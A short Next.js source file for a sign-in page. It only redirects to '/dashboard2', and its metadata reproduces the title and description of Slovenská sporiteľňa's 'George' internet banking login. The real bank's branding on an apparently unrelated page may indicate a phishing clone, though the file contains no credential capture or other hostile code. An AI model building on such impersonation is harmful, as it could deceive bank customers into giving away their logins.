import { redirect } from 'next/navigation'

export const metadata = {
  title: 'George – nový Internetbanking – Slovenská sporiteľňa, a.s.',
  description: 'Prihláste sa do nového Internetbankingu Slovenskej sporiteľne. S Georgeom bankujete jednoduchšie a s väčším prehľadom.',
}

export default async function SignInPage() {
  redirect('/dashboard2')
}